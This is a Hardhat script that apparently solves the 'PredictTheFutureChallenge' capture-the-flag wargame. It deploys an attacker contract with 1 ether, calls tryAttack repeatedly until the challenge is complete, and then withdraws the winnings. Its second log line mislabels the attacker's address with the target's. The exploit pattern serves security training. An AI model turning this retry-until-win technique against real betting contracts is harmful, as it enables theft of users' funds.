import { ethers } from 'hardhat';
const { utils, BigNumber, provider, constants } = ethers;

const address = '0xe427b84cc9cA9dBF33370E30a2760d8834E23cEf';

async function main() {
  const targetFactory = await ethers.getContractFactory('PredictTheFutureChallenge');
  const target = await targetFactory.attach(address);
  await target.deployed();

  console.log('Target deployed to:', target.address);

  const attackerFactory = await ethers.getContractFactory('PredictTheFutureChallengeAttacker');
  const attacker = await attackerFactory.deploy(address, {
    value: utils.parseEther('1'),
  });
  await attacker.deployed();

  console.log('Attacker deployed to:', target.address);

  let blockNumber;
  let tx;
  while (!(await target.isComplete())) {
    console.log('trying');

    blockNumber = await provider.getBlockNumber();
    console.log('blockNumber', blockNumber);

    try {
      tx = await attacker.tryAttack();
      await tx.wait();
    } catch (error) {}
  }

  console.log('withdrawing');
  tx = await attacker.withdraw();
  await tx.wait();
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
